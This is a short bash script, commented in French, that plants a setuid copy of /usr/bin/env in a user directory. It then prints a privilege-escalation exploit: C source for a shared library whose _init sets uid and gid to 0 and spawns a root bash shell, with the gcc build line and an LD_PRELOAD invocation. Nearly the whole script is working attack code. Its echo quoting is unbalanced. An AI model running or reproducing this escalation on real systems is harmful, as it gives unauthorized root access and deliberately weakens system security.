#!/bin/bash
# Activation d'une élévation via LD_PRELOAD

cp /usr/bin/env /home/user/bin/
chmod 4755 /home/user/bin/env

echo "✅ LD_PRELOAD exploitable. Exploitation :
echo '#include <stdio.h>
#include <stdlib.h>
void _init() {
    setgid(0);
    setuid(0);
    system(\"/bin/bash\");
}' > /home/user/tmp/exploit.c

gcc -fPIC -shared -o /home/user/tmp/exploit.so /home/user/tmp/exploit.c -nostartfiles
env LD_PRELOAD=/home/user/tmp/exploit.so /bin/ls"
